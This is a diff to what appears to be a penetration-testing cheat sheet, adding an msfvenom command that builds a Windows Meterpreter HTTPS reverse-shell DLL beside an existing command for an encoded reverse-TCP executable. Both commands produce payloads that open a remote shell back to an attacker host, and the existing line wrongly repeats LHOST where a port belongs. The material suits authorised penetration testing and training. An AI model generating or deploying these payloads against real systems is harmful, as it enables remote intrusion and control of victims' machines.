@@ -485,6 +485,10 @@ $ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=<Port #> -f exe -e x86/shikata_ga_nai -o <Outpuf File>
 ```
+##### Windows Meterpreter HTTPS Reverse Shell as DLL
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f dll -o payload.dll
+```
 
 # Client-Side Exploits
 ### Exploit Client with Adobe Flash
